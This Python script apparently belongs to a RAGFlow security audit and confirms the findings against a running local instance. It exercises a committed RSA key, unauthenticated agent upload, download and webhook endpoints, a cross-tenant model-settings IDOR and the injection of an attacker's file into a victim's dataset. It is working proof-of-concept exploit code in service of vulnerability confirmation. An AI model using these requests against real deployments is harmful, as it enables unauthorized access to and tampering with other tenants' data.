#!/usr/bin/env python3
"""
RAGFlow Security Audit — Live Confirmation Tests

Requires: setup.sh to have been run successfully.
Tests all findings that can be confirmed via HTTP against a running RAGFlow instance.

Usage:
    python3 autofyn_audit/live_confirmation.py [--url http://localhost:9381]
"""
import json
import sys
import time
import base64
import argparse
from typing import Optional

try:
    import requests
except ImportError:
    print("[!] 'requests' package required. Run: pip install requests")
    sys.exit(1)

try:
    from Cryptodome.PublicKey import RSA
    from Cryptodome.Cipher import PKCS1_v1_5
except ImportError:
    try:
        from Crypto.PublicKey import RSA
        from Crypto.Cipher import PKCS1_v1_5
    except ImportError:
        print("[!] 'pycryptodome' or 'pycryptodomex' required. Run: pip install pycryptodomex")
        sys.exit(1)

from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
PASS = 0
FAIL = 0
RESULTS = []

MINIMAL_AGENT_DSL = {
    "components": {
        "begin": {
            "obj": {"component_name": "Begin", "params": {}},
            "downstream": ["message"],
            "upstream": [],
        },
        "message": {
            "obj": {"component_name": "Message", "params": {"content": ["{sys.query}"]}},
            "downstream": [],
            "upstream": ["begin"],
        },
    },
    "history": [],
    "retrieval": [],
    "path": [],
    "globals": {
        "sys.query": "",
        "sys.user_id": "",
        "sys.conversation_turns": 0,
        "sys.files": [],
    },
    "variables": {},
}


def build_webhook_agent_dsl() -> dict:
    """Build a minimal agent whose webhook executes synchronously."""
    params = {
        "mode": "Webhook",
        "methods": ["POST"],
        "security": {},
        "content_types": "application/json",
        "schema": {
            "query": {"properties": {}, "required": []},
            "headers": {"properties": {}, "required": []},
            "body": {"properties": {}, "required": []},
        },
        "execution_mode": "Deferred",
        "response": {},
    }
    return {
        "components": {
            "begin": {
                "obj": {"component_name": "Begin", "params": params},
                "downstream": ["message"],
                "upstream": [],
            },
            "message": {
                "obj": {"component_name": "Message", "params": {"content": ["webhook-ran"]}},
                "downstream": [],
                "upstream": ["begin"],
            },
        },
        "history": [],
        "retrieval": [],
        "path": [],
        "globals": {
            "sys.query": "",
            "sys.user_id": "",
            "sys.conversation_turns": 0,
            "sys.files": [],
        },
        "variables": {},
    }


def encrypt_password(password: str) -> str:
    """Encrypt password using the committed RSA public key (Finding 1)."""
    pub_path = REPO_ROOT / "conf" / "public.pem"
    rsa_key = RSA.importKey(pub_path.read_text(), "Welcome")
    cipher = PKCS1_v1_5.new(rsa_key)
    pw_b64 = base64.b64encode(password.encode()).decode()
    return base64.b64encode(cipher.encrypt(pw_b64.encode())).decode()


def register_user(base_url: str, email: str, password: str) -> dict:
    """Register a test user, return response data."""
    enc_pw = encrypt_password(password)
    resp = requests.post(
        f"{base_url}/api/v1/users",
        json={"email": email, "nickname": "auditor", "password": enc_pw},
        timeout=30,
    )
    return resp.json()


def register_and_login(base_url: str, prefix: str) -> tuple:
    """Register a uniquely named user and return (session, user_data)."""
    email = f"{prefix}-{int(time.time() * 1000)}@test.com"
    password = "AuditTest123!"
    reg = register_user(base_url, email, password)
    if reg.get("code") != 0:
        raise RuntimeError(f"Registration failed for {email}: {reg}")
    session, user_data = login_user(base_url, email, password)
    return session, user_data


def login_user(base_url: str, email: str, password: str) -> tuple:
    """Login and return (session_with_auth, user_data).

    The login endpoint returns a JWT in the Authorization response header.
    This is exactly how the RAGFlow frontend authenticates — no special
    access or container exec required.
    """
    enc_pw = encrypt_password(password)
    resp = requests.post(
        f"{base_url}/api/v1/auth/login",
        json={"email": email, "password": enc_pw},
        timeout=30,
    )
    data = resp.json()
    if data.get("code") != 0:
        raise RuntimeError(f"Login failed: {data}")

    user_data = data["data"]

    # The server returns the JWT in the Authorization response header
    auth_header = resp.headers.get("Authorization", "")
    if not auth_header:
        raise RuntimeError("Login succeeded but no Authorization header in response")

    session = requests.Session()
    session.headers["Authorization"] = f"Bearer {auth_header}"

    # Verify auth works
    verify = session.get(f"{base_url}/api/v1/datasets", timeout=10)
    if verify.json().get("code") == 401:
        raise RuntimeError("Auth verification failed — token rejected")

    return session, user_data


def create_agent(session: requests.Session, base_url: str, title: str, dsl: dict) -> dict:
    resp = session.post(
        f"{base_url}/api/v1/agents",
        json={"title": title, "dsl": dsl},
        timeout=30,
    )
    data = resp.json()
    if data.get("code") != 0:
        raise RuntimeError(f"Agent creation failed: {data}")
    return data["data"]


def create_dataset(session: requests.Session, base_url: str, name: str) -> dict:
    resp = session.post(f"{base_url}/api/v1/datasets", json={"name": name}, timeout=30)
    data = resp.json()
    if data.get("code") != 0:
        raise RuntimeError(f"Dataset creation failed: {data}")
    return data["data"]


def upload_standalone_file(session: requests.Session, base_url: str, filename: str, content: bytes) -> dict:
    resp = session.post(
        f"{base_url}/api/v1/files",
        files={"file": (filename, content)},
        timeout=30,
    )
    data = resp.json()
    if data.get("code") != 0:
        raise RuntimeError(f"Standalone file upload failed: {data}")
    return data["data"][0]


def list_dataset_documents(session: requests.Session, base_url: str, dataset_id: str) -> dict:
    resp = session.get(f"{base_url}/api/v1/datasets/{dataset_id}/documents", timeout=30)
    data = resp.json()
    if data.get("code") != 0:
        raise RuntimeError(f"List dataset documents failed: {data}")
    return data["data"]


def get_models(session: requests.Session, base_url: str) -> dict:
    resp = session.get(f"{base_url}/api/v1/users/me/models", timeout=30)
    data = resp.json()
    if data.get("code") != 0:
        raise RuntimeError(f"Get models failed: {data}")
    return data["data"]


def record(finding_id: int, title: str, confirmed: bool, detail: str) -> None:
    """Record a test result."""
    global PASS, FAIL
    status = "CONFIRMED" if confirmed else "FAILED"
    if confirmed:
        PASS += 1
    else:
        FAIL += 1
    RESULTS.append((finding_id, title, status, detail))
    print(f"  [{status}] Finding {finding_id}: {title}")
    print(f"           {detail}")
    print()


def test_finding_1(base_url: str) -> None:
    """Finding 1: Committed RSA key — confirmed by successful registration using repo keys."""
    try:
        enc = encrypt_password("AuditTest123!")
        record(1, "RSA Key Compromise", True,
               f"Encrypted password using committed key+passphrase 'Welcome'. Ciphertext: {enc[:40]}...")
    except Exception as e:
        record(1, "RSA Key Compromise", False, str(e))


def test_finding_5(base_url: str) -> None:
    """Finding 5: Unauthenticated document image retrieval."""
    # Protected endpoint should return 401
    r_protected = requests.get(f"{base_url}/api/v1/datasets", timeout=10)
    # Unprotected image endpoint should NOT return 401
    r_image = requests.get(f"{base_url}/api/v1/documents/images/test-test", timeout=10)

    protected_code = r_protected.json().get("code", -1) if "json" in r_protected.headers.get("content-type", "") else -1
    image_code = r_image.json().get("code", -1) if "json" in r_image.headers.get("content-type", "") else -1

    confirmed = (protected_code == 401) and (image_code != 401)
    record(5, "Unauth Document Image", confirmed,
           f"Protected /datasets -> code:{protected_code}, Unprotected /documents/images -> code:{image_code}")


def test_finding_6_and_7(base_url: str, owner_session: requests.Session, owner_data: dict) -> None:
    """Findings 6-7: create a real agent, upload without auth, then download without auth."""
    try:
        agent = create_agent(
            owner_session,
            base_url,
            title=f"audit-upload-{int(time.time())}",
            dsl=MINIMAL_AGENT_DSL,
        )
        payload = b"HELLO_FROM_UNAUTH"
        r_upload = requests.post(
            f"{base_url}/api/v1/agents/{agent['id']}/upload",
            files={"file": ("hello.txt", payload)},
            timeout=30,
        )
        upload_json = r_upload.json()
        upload_data = upload_json.get("data", {}) if isinstance(upload_json.get("data"), dict) else {}
        file_id = upload_data.get("id")
        upload_ok = upload_json.get("code") == 0 and file_id and upload_data.get("created_by") == owner_data["id"]
        record(
            6,
            "Unauth Agent Upload",
            bool(upload_ok),
            (
                f"POST /agents/{agent['id']}/upload without auth -> code:{upload_json.get('code')}, "
                f"created_by:{upload_data.get('created_by')}, file_id:{file_id}"
            ),
        )

        if not upload_ok:
            record(7, "Unauth Agent Download", False, "Upload step failed, download check skipped")
            return

        r_download = requests.get(
            f"{base_url}/api/v1/agents/download",
            params={"created_by": owner_data["id"], "id": file_id},
            timeout=30,
        )
        confirmed = r_download.status_code == 200 and r_download.content == payload
        record(
            7,
            "Unauth Agent Download",
            confirmed,
            f"GET /agents/download without auth -> http:{r_download.status_code}, bytes:{len(r_download.content)}",
        )
    except Exception as e:
        record(6, "Unauth Agent Upload", False, str(e))
        record(7, "Unauth Agent Download", False, "Upload/download sequence aborted")


def test_finding_13(base_url: str, owner_session: requests.Session) -> None:
    """Finding 13: create a real webhook agent and invoke it without auth."""
    try:
        agent = create_agent(
            owner_session,
            base_url,
            title=f"audit-webhook-{int(time.time())}",
            dsl=build_webhook_agent_dsl(),
        )
        r = requests.post(
            f"{base_url}/api/v1/agents/{agent['id']}/webhook/test",
            json={"hello": "world"},
            timeout=30,
        )
        detail = f"POST /agents/{agent['id']}/webhook/test without auth -> http:{r.status_code}, body:{r.text[:80]}"
        confirmed = False
        try:
            body = r.json()
            confirmed = r.status_code == 200 and body.get("message") == "webhook-ran" and body.get("success") is True
        except Exception:
            confirmed = False
        record(13, "Unauth Webhook Execution", confirmed, detail)
    except Exception as e:
        record(13, "Unauth Webhook Execution", False, str(e))


def test_finding_15(base_url: str, doc_id: Optional[str]) -> None:
    """Finding 15: Unauthenticated bulk thumbnail retrieval."""
    r_protected = requests.get(f"{base_url}/api/v1/datasets", timeout=10)
    target_doc = doc_id or "test-uuid"
    r_thumbnails = requests.get(f"{base_url}/api/v1/thumbnails?doc_ids={target_doc}", timeout=10)

    p_code = r_protected.json().get("code", -1) if "json" in r_protected.headers.get("content-type", "") else -1
    t_code = r_thumbnails.json().get("code", -1) if "json" in r_thumbnails.headers.get("content-type", "") else -1

    confirmed = (p_code == 401) and (t_code != 401)
    detail = f"Protected /datasets -> code:{p_code}, Unprotected /thumbnails({target_doc}) -> code:{t_code}"
    if t_code == 0:
        detail += " (returned success with no auth!)"
    record(15, "Unauth Bulk Thumbnails", confirmed, detail)


def test_finding_16(
    base_url: str,
    attacker_session: requests.Session,
    victim_session: requests.Session,
    victim_data: dict,
) -> None:
    """Finding 16: mutate a real victim tenant and verify the victim sees the change."""
    try:
        before = get_models(victim_session, base_url)
        unique_llm = f"audit-llm-{int(time.time())}"
        unique_embd = f"audit-embd-{int(time.time())}"
        r = attacker_session.patch(
            f"{base_url}/api/v1/users/me/models",
            json={
                "tenant_id": victim_data["id"],
                "llm_id": unique_llm,
                "embd_id": unique_embd,
                "asr_id": "audit-asr",
                "img2txt_id": "audit-img",
            },
            timeout=30,
        )
        resp = r.json()
        after = get_models(victim_session, base_url)
        confirmed = (
            resp.get("code") == 0
            and after.get("tenant_id") == victim_data["id"]
            and after.get("llm_id") == unique_llm
            and after.get("embd_id") == unique_embd
            and after.get("llm_id") != before.get("llm_id")
        )
        record(
            16,
            "IDOR Tenant Model Update",
            confirmed,
            (
                f"attacker patched victim tenant {victim_data['id']} -> code:{resp.get('code')}, "
                f"victim llm_id:{before.get('llm_id')}->{after.get('llm_id')}"
            ),
        )
    except Exception as e:
        record(16, "IDOR Tenant Model Update", False, str(e))


def test_finding_17(
    base_url: str,
    attacker_session: requests.Session,
    attacker_data: dict,
    victim_session: requests.Session,
) -> Optional[str]:
    """Finding 17: inject an attacker-owned file into a victim-owned dataset."""
    try:
        dataset = create_dataset(victim_session, base_url, f"victim-ds-{int(time.time())}")
        before = list_dataset_documents(victim_session, base_url, dataset["id"])
        attacker_file = upload_standalone_file(
            attacker_session,
            base_url,
            "attacker.txt",
            b"ATTACKER_CONTENT",
        )
        r = attacker_session.post(
            f"{base_url}/api/v1/files/link-to-datasets",
            json={"file_ids": [attacker_file["id"]], "kb_ids": [dataset["id"]]},
            timeout=30,
        )
        resp = r.json()

        doc_id = None
        confirmed = False
        for _ in range(10):
            after = list_dataset_documents(victim_session, base_url, dataset["id"])
            docs = after.get("docs", [])
            injected = next((d for d in docs if d.get("location") == "attacker.txt"), None)
            if injected:
                doc_id = injected.get("id")
                confirmed = (
                    resp.get("code") == 0
                    and injected.get("created_by") == attacker_data["id"]
                    and injected.get("dataset_id") == dataset["id"]
                    and after.get("total", 0) > before.get("total", 0)
                )
                break
            time.sleep(0.5)

        record(
            17,
            "Cross-Tenant KB Injection",
            confirmed,
            (
                f"attacker file {attacker_file['id']} linked into victim dataset {dataset['id']} -> "
                f"code:{resp.get('code')}, injected_doc:{doc_id}"
            ),
        )
        return doc_id
    except Exception as e:
        record(17, "Cross-Tenant KB Injection", False, str(e))
        return None


def main() -> None:
    parser = argparse.ArgumentParser(description="RAGFlow Audit Live Confirmation")
    parser.add_argument("--url", default="http://localhost:9381",
                        help="RAGFlow base URL (default: http://localhost:9381)")
    args = parser.parse_args()
    base_url = args.url.rstrip("/")

    print("=" * 70)
    print("  RAGFlow Security Audit — Live Confirmation Tests")
    print(f"  Target: {base_url}")
    print("=" * 70)
    print()

    # Check server is reachable
    try:
        r = requests.get(f"{base_url}/api/v1/datasets", timeout=10)
    except requests.ConnectionError:
        print(f"[!] Cannot connect to {base_url}. Run setup.sh first.")
        sys.exit(1)

    # --- Finding 1: RSA key compromise (no server needed, but confirms key works) ---
    print("[*] Testing Finding 1: RSA Key Compromise")
    test_finding_1(base_url)

    # --- Register + Login for live object creation ---
    print("[*] Registering live test users...")
    try:
        owner_session, owner_data = register_and_login(base_url, "audit-owner")
        attacker_session, attacker_data = register_and_login(base_url, "audit-attacker")
        victim_session, victim_data = register_and_login(base_url, "audit-victim")
        print(f"    Owner    : {owner_data['id']}")
        print(f"    Attacker : {attacker_data['id']}")
        print(f"    Victim   : {victim_data['id']}")
    except Exception as e:
        print(f"[!] User bootstrap failed: {e}")
        print("    Authenticated tests will be skipped.")
        owner_session = None
        owner_data = None
        attacker_session = None
        attacker_data = None
        victim_session = None
        victim_data = None
    print()

    # --- Unauthenticated endpoint tests ---
    print("[*] Testing unauthenticated endpoint findings...")
    test_finding_5(base_url)
    if owner_session and owner_data:
        test_finding_6_and_7(base_url, owner_session, owner_data)
        test_finding_13(base_url, owner_session)
    else:
        print("[!] Skipping findings 6, 7, and 13 (no owner session)")
        RESULTS.append((6, "Unauth Agent Upload", "SKIPPED", "No owner session"))
        RESULTS.append((7, "Unauth Agent Download", "SKIPPED", "No owner session"))
        RESULTS.append((13, "Unauth Webhook Execution", "SKIPPED", "No owner session"))

    # --- Authenticated IDOR/cross-tenant tests ---
    doc_id = None
    if attacker_session and attacker_data and victim_session and victim_data:
        print("[*] Testing authenticated IDOR/cross-tenant findings...")
        doc_id = test_finding_17(base_url, attacker_session, attacker_data, victim_session)
        test_finding_15(base_url, doc_id)
        test_finding_16(base_url, attacker_session, victim_session, victim_data)
    else:
        print("[!] Skipping findings 15, 16, and 17 (no attacker/victim sessions)")
        test_finding_15(base_url, None)
        RESULTS.append((16, "IDOR Tenant Model Update", "SKIPPED", "No attacker/victim sessions"))
        RESULTS.append((17, "Cross-Tenant KB Injection", "SKIPPED", "No attacker/victim sessions"))

    # --- Summary ---
    print()
    print("=" * 70)
    print("  LIVE CONFIRMATION RESULTS")
    print("=" * 70)
    print()
    print(f"  {'#':<4} {'Finding':<40} {'Status':<12}")
    print(f"  {'─'*4} {'─'*40} {'─'*12}")
    for fid, title, status, detail in RESULTS:
        print(f"  {fid:<4} {title:<40} {status:<12}")
    print()
    print(f"  Confirmed: {PASS}  |  Failed: {FAIL}")
    print()

    # Findings NOT tested live (confirmed via standalone exploit scripts):
    not_live = [2, 3, 4, 8, 9, 10, 11, 12, 14]
    print("  Findings confirmed via standalone PoC scripts (no server needed):")
    print(f"  {', '.join(str(n) for n in not_live)}")
    print()
    print("=" * 70)

    if FAIL > 0:
        sys.exit(1)


if __name__ == "__main__":
    main()
